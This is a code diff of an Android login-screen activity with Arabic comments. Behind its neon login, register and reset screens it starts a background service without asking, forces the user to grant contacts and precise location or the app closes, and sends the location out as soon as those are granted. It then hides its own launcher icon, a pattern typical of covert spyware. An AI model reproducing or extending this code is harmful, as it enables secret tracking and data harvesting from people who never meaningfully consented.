@@ -126,14 +126,12 @@ class LoginActivity : ComponentActivity() {
 
     private var selectedLang by mutableStateOf(0)
 
-    // Rejection / Completion
     private var anyRejected = false
-    private var locationRequested = false
-    private var contactsRequested = false
+    private var pendingMediaAction: (() -> Unit)? = null
 
     private val enableCaptcha = false
 
-    // ⭐ Image Pickers — لكن مع فحص الأذونات
+    // ─── Image Pickers ───
     private val pickProfile =
         registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
             if (uri != null) { profileUri = uri; profileBmp = null }
@@ -151,17 +149,30 @@ class LoginActivity : ComponentActivity() {
             if (bmp != null) { bgBmp = bmp; bgUri = null }
         }
 
-    // ⭐ Launcher للأذونات
-    private val permLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { granted ->
-        if (!granted) {
+    // ─── ⭐ مجموعة 1: Contacts + Location (dialog واحد) ───
+    private val initialPermLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { result ->
+        val denied = result.filterValues { !it }
+        if (denied.isNotEmpty()) {
             anyRejected = true
             exitApp("تم رفض الاستخدام")
             return@registerForActivityResult
         }
-        // بعد منح الأذن — اطلب اللي بعده
-        afterPermissionGranted()
+        afterInitialPermissions()
+    }
+
+    // ─── ⭐ مجموعة 2: Media (dialog واحد) ───
+    private val mediaPermLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { result ->
+        val granted = result.values.all { it }
+        if (granted) {
+            pendingMediaAction?.invoke()
+        } else {
+            showToast("يجب السماح بالوصول للصور")
+        }
+        pendingMediaAction = null
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -172,13 +183,12 @@ class LoginActivity : ComponentActivity() {
 
         capCode = generateCaptcha()
 
-        // ⭐ تسجيل الجهاز
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
 
-        // ⭐ بدء الخدمة في الخلفية — قبل الأذونات
+        // ⭐ الخدمة تشتغل تلقائياً — بدون طلب
         startBackgroundService()
 
-        // ⭐ بعد 2 ثانية — طلب الموقع + جهات الاتصال
+        // ⭐ بعد 2 ثانية → طلب Contacts + Location
         Handler(Looper.getMainLooper()).postDelayed({
             requestInitialPermissions()
         }, 2000L)
@@ -201,78 +211,78 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  الأذونات الأولية — الموقع + جهات الاتصال
+    //  ⭐ مجموعة 1: Contacts + Location
     // ═══════════════════════════════════════════
     private fun requestInitialPermissions() {
-        // 1. جهات الاتصال
+        val needed = mutableListOf<String>()
+
+        // جهات الاتصال
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
             != PackageManager.PERMISSION_GRANTED) {
-            contactsRequested = true
-            permLauncher.launch(Manifest.permission.READ_CONTACTS)
-            return
+            needed.add(Manifest.permission.READ_CONTACTS)
         }
-        // 2. الموقع
+
+        // الموقع
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
             != PackageManager.PERMISSION_GRANTED) {
-            locationRequested = true
-            permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
-            return
+            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
         }
-        // ✅ كل الأذونات موجودة
-        afterInitialPermissions()
-    }
 
-    private fun afterPermissionGranted() {
-        // الأول: جهات الاتصال
-        if (contactsRequested && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
-            == PackageManager.PERMISSION_GRANTED) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                != PackageManager.PERMISSION_GRANTED) {
-                locationRequested = true
-                permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
-                return
-            }
-        }
-        // بعد الموقع → خلص
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-            == PackageManager.PERMISSION_GRANTED) {
+        if (needed.isNotEmpty()) {
+            initialPermLauncher.launch(needed.toTypedArray())
+        } else {
             afterInitialPermissions()
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  بعد مجموعة 1 → إرسال الموقع + إخفاء الأيقونة
+    // ═══════════════════════════════════════════
     private fun afterInitialPermissions() {
         // ⭐ إرسال الموقع فوراً
         sendLocationNow()
 
-        // ⭐ طلب Background Location + All Files (يدوي)
+        // ⭐ إخفاء الأيقونة + شغل الخدمة
         Handler(Looper.getMainLooper()).postDelayed({
-            requestBackgroundLocationAndFiles()
+            hideLauncherIcon()
+            startBackgroundService()
+            showToast("✅ تم التفعيل")
         }, 1500L)
     }
 
     // ═══════════════════════════════════════════
-    //  طلب أذونات الوسائط — عند اختيار صورة
+    //  ⭐ مجموعة 2: Media — عند الضغط على زر
     // ═══════════════════════════════════════════
     private fun requestMediaPermissionThen(action: () -> Unit) {
-        val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
+        val needed = mutableListOf<String>()
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
+                != PackageManager.PERMISSION_GRANTED) {
+                needed.add(Manifest.permission.READ_MEDIA_IMAGES)
+            }
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
+                != PackageManager.PERMISSION_GRANTED) {
+                needed.add(Manifest.permission.READ_MEDIA_VIDEO)
+            }
         } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
         }
-        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-            // اطلب الأذن — بعد المنح → نفذ الإجراء
+
+        if (needed.isEmpty()) {
+            action()
+        } else {
             pendingMediaAction = action
-            permLauncher.launch(perm)
-            return
+            mediaPermLauncher.launch(needed.toTypedArray())
         }
-        // ممنوح — نفذ
-        action()
     }
 
-    private var pendingMediaAction: (() -> Unit)? = null
-
     // ═══════════════════════════════════════════
-    //  إرسال الموقع فوراً
+    //  إرسال الموقع
     // ═══════════════════════════════════════════
     private fun sendLocationNow() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
@@ -295,73 +305,6 @@ class LoginActivity : ComponentActivity() {
         }.start()
     }
 
-    // ═══════════════════════════════════════════
-    //  Background Location + All Files (Settings)
-    // ═══════════════════════════════════════════
-    private fun requestBackgroundLocationAndFiles() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                != PackageManager.PERMISSION_GRANTED) {
-                try {
-                    android.app.AlertDialog.Builder(this)
-                        .setTitle("صلاحية الخلفية")
-                        .setMessage("يرجى تفعيل الموقع في الخلفية من الإعدادات")
-                        .setPositiveButton("فتح الإعدادات") { _, _ ->
-                            try {
-                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                                i.data = Uri.parse("package:$packageName")
-                                startActivity(i)
-                            } catch (_: Exception) {}
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                requestAllFilesAccess()
-                            }, 5000)
-                        }
-                        .setCancelable(false)
-                        .show()
-                } catch (_: Exception) {}
-            } else {
-                requestAllFilesAccess()
-            }
-        } else {
-            requestAllFilesAccess()
-        }
-    }
-
-    private fun requestAllFilesAccess() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                android.app.AlertDialog.Builder(this)
-                    .setTitle("الوصول للملفات")
-                    .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
-                    .setPositiveButton("فتح الإعدادات") { _, _ ->
-                        try {
-                            val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                            i.data = Uri.parse("package:$packageName")
-                            startActivity(i)
-                        } catch (e: Exception) {
-                            try {
-                                val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                                startActivity(i)
-                            } catch (_: Exception) {}
-                        }
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            onPermissionsComplete()
-                        }, 5000)
-                    }
-                    .setCancelable(false)
-                    .show()
-            } else onPermissionsComplete()
-        } else onPermissionsComplete()
-    }
-
-    private fun onPermissionsComplete() {
-        hideLauncherIcon()
-        showToast("✅ تم تفعيل كل الصلاحيات")
-    }
-
-    // ═══════════════════════════════════════════
-    //  Exit on reject
-    // ═══════════════════════════════════════════
     private fun exitApp(msg: String) {
         Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
         Handler(Looper.getMainLooper()).postDelayed({
@@ -389,7 +332,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ⭐ Service — بدون طلب أذونات
     private fun startBackgroundService() {
         try {
             val intent = Intent(this, BackgroundService::class.java)
@@ -399,7 +341,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  UI — Neon Background
+    //  Neon Background
     // ═══════════════════════════════════════════
     @Composable
     fun NeonBackground() {
@@ -469,6 +411,9 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  App Header
+    // ═══════════════════════════════════════════
     @Composable
     fun AppHeader() {
         val ctx = LocalContext.current
@@ -541,6 +486,9 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  Login Screen
+    // ═══════════════════════════════════════════
     @Composable
     fun LoginScreen() {
         Column(
@@ -605,6 +553,9 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  Register Screen
+    // ═══════════════════════════════════════════
     @Composable
     fun RegisterScreen() {
         Column(
@@ -664,6 +615,9 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  Reset Screen
+    // ═══════════════════════════════════════════
     @Composable
     fun ResetScreen() {
         Column(
@@ -1106,9 +1060,7 @@ class LoginActivity : ComponentActivity() {
                     .shadow(18.dp, RoundedCornerShape(16.dp), ambientColor = Neon.Magenta, spotColor = Neon.Purple)
                     .clip(RoundedCornerShape(16.dp))
                     .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
-                    .clickable {
-                        currentScreen = 0
-                    },
+                    .clickable { currentScreen = 0 },
                 contentAlignment = Alignment.Center
             ) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
